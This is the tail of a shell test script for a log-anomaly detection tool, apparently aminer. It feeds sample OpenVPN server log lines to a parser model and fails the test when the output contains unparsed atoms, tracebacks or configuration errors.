            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 peer info: IV_LZ4=1"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 peer info: IV_COMP_STUB=1"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 peer info: IV_TCPNL=1"
            echo "2022-01-21 00:09:11 jhall/192.168.230.165:46011 Outgoing Data Channel: Cipher 'AES-256-CBC' initialized with 256 bit key"
            echo "2022-01-21 03:49:44 jhall/192.168.230.165:46011 TLS: soft reset sec=3309/3308 bytes=45892/-1 pkts=651/0"
            echo "2022-01-21 06:30:01 192.168.230.95:60795 TLS: Initial packet from [AF_INET]192.168.230.95:60795, sid=30d47335 8140d551"
            echo "2022-01-21 06:30:01 192.168.230.95:60795 peer info: IV_NCP=2"
            echo "2022-01-21 06:30:01 192.168.230.95:60795 [twhite] Peer Connection Initiated with [AF_INET]192.168.230.95:60795"
            echo "2022-01-21 06:30:01 twhite/192.168.230.95:60795 MULTI_sva: pool returned IPv4=10.9.0.6, IPv6=(Not enabled)"
            echo "2022-01-21 06:30:01 twhite/192.168.230.95:60795 MULTI: Learn: 10.9.0.6 -> twhite/192.168.230.95:60795"
            echo "2022-01-21 06:30:01 twhite/192.168.230.95:60795 MULTI: primary virtual IP for twhite/192.168.230.95:60795: 10.9.0.6"
            echo "2022-01-21 06:30:03 twhite/192.168.230.95:60795 PUSH: Received control message: 'PUSH_REQUEST'"
            echo "2022-01-21 06:30:03 twhite/192.168.230.95:60795 SENT CONTROL [twhite]: 'PUSH_REPLY,redirect-gateway def1,block-outside-dns,route 10.9.0.1,topology net30,ping 10,ping-restart 120,ifconfig 10.9.0.6 10.9.0.5,peer-id 0,cipher AES-256-CBC' (status=1)"
            echo "2022-01-21 08:09:33 jhall/192.168.230.165:46011 [jhall] Inactivity timeout (--ping-restart), restarting"
            echo "2022-01-21 08:09:33 jhall/192.168.230.165:46011 SIGUSR1[soft,ping-restart] received, client-instance restarting"
            echo "2022-01-23 14:54:54 jhall/192.168.230.165:59814 TLS Error: TLS key negotiation failed to occur within 60 seconds (check your network connectivity)"
            echo "2022-01-23 14:54:54 jhall/192.168.230.165:59814 TLS Error: TLS handshake failed"
            echo "2022-01-23 14:54:54 jhall/192.168.230.165:59814 TLS: move_session: dest=TM_LAME_DUCK src=TM_ACTIVE reinit_src=1"
            ;;
        *)
            echo "Unknown parser config '$BN' was found! Please extend these tests. Failing.."
            exit_code=2
            continue
            ;;
    esac

    cat >> $CONFIG_PATH <<EOL

Parser:
        - id: 'testingModel'
          type: $BN
          name: 'testedModel'

        - id: 'startModel'
          start: True
          type: SequenceModelElement
          name: 'model'
          args:
            - testingModel
EOL

    runAminerUntilEnd "sudo aminer -C -c $CONFIG_PATH" "$LOGFILE" "/tmp/lib/aminer/AnalysisChild/RepositioningData" > $OUT 2>&1
    exit_code=$?

    if [[ `grep -ic "VerboseUnparsedAtomHandler" $OUT` != 0 && $BN != "AminerParsingModel" ]] || [[ `grep -o '\bVerboseUnparsedAtomHandler\b' $OUT | wc -l` > 5 ]] || `grep -Fq "Traceback" $OUT` || `grep -Fq "{'Parser'" $OUT` || `grep -Fq "FATAL" $OUT` || `grep -Fq "Config-Error" $OUT`; then
      echo "Failed Test in $filename"
	    exit_code=1
	    cat $OUT
	    echo
	    echo
    fi
done

rm $CONFIG_PATH
exit $exit_code
